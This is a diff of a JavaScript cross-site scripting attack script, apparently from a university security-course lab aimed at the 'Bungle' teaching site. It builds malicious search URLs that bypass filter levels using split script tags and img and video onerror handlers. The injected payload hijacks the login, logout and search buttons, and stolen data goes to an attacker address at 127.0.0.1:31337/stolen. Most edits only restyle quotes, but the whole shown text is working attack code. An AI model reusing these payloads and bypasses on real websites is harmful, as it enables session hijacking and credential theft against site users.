@@ -46,7 +46,7 @@ function payload(attacker) {
         let usernameField = $("#username")[0];
         let userpassField = $("#userpass")[0];
 
-        $('.form-inline').attr('onsubmit', 'return false');
+        $(".form-inline").attr("onsubmit", "return false");
 
         /* login button */
         if (loginButton) {
@@ -129,13 +129,13 @@ function payload(attacker) {
                     return false;
                 });
             });
-            logoutButton.attr('onsubmit', 'return false');
+            logoutButton.attr("onsubmit", "return false");
         }
 
         /* bungle button */
         let bungleLink = $("#bungle-lnk");
         if (bungleLink) {
-            bungleLink.removeAttr('href');
+            bungleLink.removeAttr("href");
             bungleLink.click(function() {
                 $.get("./")
                 .done(function(data) {
@@ -159,13 +159,13 @@ function payload(attacker) {
                     return false;
                 });
             });
-            searchButton.attr('onsubmit', 'return false');
+            searchButton.attr("onsubmit", "return false");
         }
 
         /* search again button */
         let searchAgainButton = $("#search-again-btn");
         if (searchAgainButton) {
-            searchAgainButton.removeAttr('href');
+            searchAgainButton.removeAttr("href");
             searchAgainButton.click(function() {
                 $.get("./")
                 .done(function(data) {
@@ -177,7 +177,7 @@ function payload(attacker) {
         }
 
         /* search history */
-        $(".history-item").removeAttr('href');
+        $(".history-item").removeAttr("href");
         $.each($(".history-item"), function() {
             console.log("helasd1");
 
@@ -205,7 +205,7 @@ function payload(attacker) {
 
     function proxy(href) {
         $("body").load(href, function() {
-            $("body").attr('style', 'background-color:powderblue;');
+            $("body").attr("style", "background-color:powderblue;");
             updateCurrentPage($("body").html(), "Bungle!", "./");
 
             window.onpopstate = function(event) {
@@ -222,7 +222,7 @@ function payload(attacker) {
 
 function makeLink(xssdefense, target, attacker) {
     var payloadString = payload.toString()
-    payloadString = payloadString.replace(/^\s+/mg, '');
+    payloadString = payloadString.replace(/^\s+/mg, "");
 
     if (xssdefense == 0) {
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
@@ -234,8 +234,8 @@ function makeLink(xssdefense, target, attacker) {
             ";payload(\"" + attacker + "\");</scrscriptipt" + ">");
     } else if (xssdefense == 2) {
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-            encodeURIComponent("<img src='x' onerror=\'" + payloadString
-            + ";payload(\"" + attacker + "\");\'>");
+            encodeURIComponent("<img src=x onerror=\'" + payloadString
+            + "payload(\"" + attacker + "\");\'>");
     } else if (xssdefense == 3){
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
             encodeURIComponent("<video src=x onerror=\'" + payloadString
@@ -253,7 +253,7 @@ function makeLink(xssdefense, target, attacker) {
     }
 }
 
-var xssdefense = 3;
+var xssdefense = 0;
 var target = "http://bungle-cs461.csl.illinois.edu/";
 // var target = "http://192.168.1.38:8080/";
 var attacker = "http://127.0.0.1:31337/stolen";
